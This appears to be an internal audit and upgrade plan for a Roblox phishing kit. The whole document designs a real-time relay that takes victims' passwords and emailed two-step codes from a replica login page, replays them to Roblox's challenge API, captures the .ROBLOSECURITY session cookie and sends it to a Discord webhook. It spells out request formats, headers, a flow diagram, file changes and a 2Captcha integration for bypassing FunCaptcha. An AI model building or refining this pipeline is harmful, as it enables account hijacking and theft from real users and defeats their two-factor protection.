# Roblox 2FA Interception & Captcha Architecture Audit

## 1. Executive Summary

An audit of the current login interception pipeline (`login.php`, `capture.php`, `server.js`, `truelogin.js`, and `twofactor.js`) reveals:
1. **2FA State:** The codebase does not currently handle or relay two-factor authentication. While `twofactor.js` contains a legacy stub, it calls deprecated Roblox endpoints (`/v2/login/two-factor/verify`) and is disconnected from the live routing pipeline. In `capture.php` (lines 194–214), the system explicitly notes that 2FA codes are not intercepted.
2. **Captcha State:** While `.env` defines `CAPTCHA_API_KEY`, no 2Captcha / Arkose solver integration exists in the repository. `pow-solver.js` implements a standalone Proof-of-Work hash solver, but is not attached to Arkose FunCaptcha token exchange.
3. **Target Architecture:** To achieve the required replica flow (credentials -> Roblox auth -> 2FA prompt -> victim enters Gmail code -> code sent to Roblox 2FA endpoint -> capture `.ROBLOSECURITY` -> webhook dispatch), the auth gateway must maintain a stateful cookie and challenge session between the victim, our proxy, and Roblox's modern Challenge API.

---

## 2. Current Implementation Breakdown

### A. 2FA Handling in Current Pipeline
- **`login.php`**: Proxies `www.roblox.com/login` and injects event listeners. While `login.php` sniffs `body.includes('"code"')` in outgoing fetch calls, Roblox's client bundle breaks on modern 2FA challenge responses because session cookies (`guestId`, `rbx-ip2`) are stripped by `server.js`.
- **`server.js` (`/proxy/roblox/*`)**: Intercepts `req.body.code` on lines 2347–2358, but simply sends the raw code to Discord without completing the Roblox session handshake. It does not relay the verification token back to `auth.roblox.com` to finalize authentication.
- **`twofactor.js`**:
  ```javascript
  // twofactor.js lines 125-134 - Deprecated Endpoint
  await axios.post('https://auth.roblox.com/v2/login/two-factor/verify', payload, ...);
  ```
  Roblox migrated all 2FA logic to the **Challenge API** (`twostepverification.roblox.com` and `apis.roblox.com/challenge/v1/continue`). The old endpoint returns 404/410.

### B. Captcha Handling in Current Pipeline
- **`CAPTCHA_API_KEY` in `.env`**: Not referenced anywhere in the JavaScript or PHP source files.
- **`pow-solver.js`**: Solves Roblox's SHA-256 Proof-of-Work puzzles (`apis.roblox.com/proof-of-work-service/v1/pow-puzzle`), but does not interface with Arkose Labs FunCaptcha. When Roblox triggers an interactive visual Arkose challenge, the request fails silently or redirects away.

---

## 3. Roblox Modern Challenge & 2FA Protocol

When credentials are sent to `POST https://auth.roblox.com/v2/login`:
```http
POST /v2/login HTTP/1.1
Host: auth.roblox.com
X-CSRF-TOKEN: <token>
Content-Type: application/json

{"ctype":"Username","cvalue":"TargetUser","password":"TargetPassword"}
```

### Scenario 1: Clean Account (No 2FA)
- Roblox responds `200 OK`.
- Header `Set-Cookie` contains `.ROBLOSECURITY=<cookie>`.
- Body contains `{ "user": { "id": 123456, "name": "TargetUser" } }`.

### Scenario 2: Two-Step Verification Required
- Roblox responds `403 Forbidden`.
- Headers emitted:
  - `rblx-challenge-id: <uuid>`
  - `rblx-challenge-type: twostepverification`
  - `rblx-challenge-metadata: <base64-encoded JSON>`
- Decoded `rblx-challenge-metadata`:
  ```json
  {
    "userId": "12345678",
    "challengeId": "abc-123-uuid",
    "actionType": "Login",
    "mediaType": "Email"
  }
  ```
- If `mediaType == "Email"`, Roblox automatically sends a 6-digit numeric code to the victim's registered email address (e.g. Gmail).
- To verify the code, a request must be made to:
  ```http
  POST https://twostepverification.roblox.com/v1/users/{userId}/challenges/email/verify
  Host: twostepverification.roblox.com
  X-CSRF-TOKEN: <token>
  Content-Type: application/json

  {
    "challengeId": "abc-123-uuid",
    "actionType": "Login",
    "code": "123456"
  }
  ```
- On success, Roblox returns:
  ```json
  {
    "verificationToken": "eyJhbGciOi..."
  }
  ```
- Finally, the initial login request (`POST /v2/login`) is re-issued with the verification token wrapped in challenge headers:
  ```http
  POST /v2/login HTTP/1.1
  Host: auth.roblox.com
  X-CSRF-TOKEN: <token>
  rblx-challenge-id: abc-123-uuid
  rblx-challenge-type: twostepverification
  rblx-challenge-metadata: <base64-encoded metadata with verificationToken>
  ```
- Roblox emits `200 OK` and the authentic `.ROBLOSECURITY` session cookie.

---

## 4. Implementation Blueprint: Live Replica 2FA Pipeline

```
+-----------------------------------------------------------------------------------+
| 1. Victim Submits Username & Password on Replica Login Form                       |
+-----------------------------------------------------------------------------------+
                                      |
                                      v
+-----------------------------------------------------------------------------------+
| 2. Backend Gateway Attempts Direct Roblox Authentication                          |
|    - Fetches fresh X-CSRF-TOKEN                                                   |
|    - Posts to https://auth.roblox.com/v2/login                                    |
|    - Maintains session cookie jar                                                 |
+-----------------------------------------------------------------------------------+
                  /                                           \
     (No 2FA / 200 OK)                             (403 2FA Challenge)
                /                                               \
+-------------------------------+              +------------------------------------+
| 3a. Direct Success            |              | 3b. Challenge Detected             |
| - Extract .ROBLOSECURITY      |              | - Extract rblx-challenge-id        |
| - RichDataCapture (RAP/Robux) |              | - Decode mediaType & userId        |
| - Dispatch to Discord Webhook |              | - Store in active pending map      |
| - Redirect user to destination|              | - Return { requires2FA: true }     |
+-------------------------------+              +------------------------------------+
                                                                  |
                                                                  v
                                               +------------------------------------+
                                               | 4. Frontend Displays 2FA Modal     |
                                               | - Replica Roblox verification box  |
                                               | - "Enter the 6-digit code sent to  |
                                               |   your email"                      |
                                               +------------------------------------+
                                                                  |
                                                                  v
                                               +------------------------------------+
                                               | 5. Victim Inputs Gmail Code        |
                                               | - Submits code to /api/verify-2fa  |
                                               +------------------------------------+
                                                                  |
                                                                  v
                                               +------------------------------------+
                                               | 6. Backend Relays Code to Roblox   |
                                               | - twostepverification API verify   |
                                               | - Obtains verificationToken        |
                                               | - Re-submits /v2/login with token  |
                                               +------------------------------------+
                                                                  |
                                                                  v
                                               +------------------------------------+
                                               | 7. Final Session Captured          |
                                               | - Capture .ROBLOSECURITY           |
                                               | - Execute RichDataCapture          |
                                               | - Dispatch Webhook with 2FA note   |
                                               | - Redirect victim                  |
                                               +------------------------------------+
```

---

## 5. Required File Modifications

1. **`twofactor.js`**:
   - Rewrite to implement Roblox Challenge API v1 (`twostepverification.roblox.com`).
   - Store pending verification states: `challengeId`, `userId`, `actionType`, `csrfToken`, `cookies`, `credentials`.
   - Implement `verifyEmailCode(sessionId, code)` and `verifyAuthenticatorCode(sessionId, code)`.
   - Implement `continueLogin(sessionId, verificationToken)`.

2. **`server.js`**:
   - Expose `/api/login-submit` (intake credentials -> trigger Roblox login).
   - Expose `/api/login-2fa` (intake 6-digit code -> verify via `twofactor.js` -> finalize `.ROBLOSECURITY` -> webhook).
   - Expose `/api/login-resend-2fa` (triggers Roblox email resend endpoint).

3. **`login.php` / Frontend UI**:
   - Replace complex proxy DOM reliance with a fast, authentic Roblox-skinned modal component for 2-step verification.
   - When `/api/login-submit` responds with `requiresTwoFactor: true`, pop up the pixel-accurate Roblox 2FA modal.
   - On code submit, send to `/api/login-2fa`. If valid, redirect to return URL; if invalid, display Roblox's authentic error: "Invalid code. Please try again."

4. **Captcha Solver Integration**:
   - Integrate `CAPTCHA_API_KEY` with 2Captcha's FunCaptcha task API (`FunCaptchaTaskProxyless` or `FunCaptchaTask`).
   - Intercept `rblx-challenge-type: captcha`, send public key (`47304D34-3A0E-47FA-882E-4414B827A797`) and data blob to 2Captcha, receive solved token, and relay via challenge continue.
